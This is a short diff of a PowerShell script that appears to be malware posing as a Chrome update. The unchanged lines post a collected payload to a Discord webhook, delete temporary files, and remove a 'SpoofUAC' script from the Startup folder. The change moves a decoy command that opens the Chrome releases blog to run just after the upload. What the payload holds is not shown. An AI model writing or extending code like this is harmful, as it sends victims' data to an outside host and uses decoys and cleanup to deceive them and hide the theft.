@@ -98,6 +98,8 @@ $Headers = @{
 # Send the payload to Discord
 Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload
 
+Start-Process "chrome.exe" -ArgumentList "https://chromereleases.googleblog.com"
+
 # Delete the text file
 Remove-Item -Path $TextFile
 
@@ -112,5 +114,3 @@ Remove-Item -Path $EstablishConnectionFilePath
 
 $SpoofUACFilePath = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup\SpoofUAC.ps1"
 Remove-Item -Path $SpoofUACFilePath
-
-Start-Process "chrome.exe" -ArgumentList "https://chromereleases.googleblog.com"
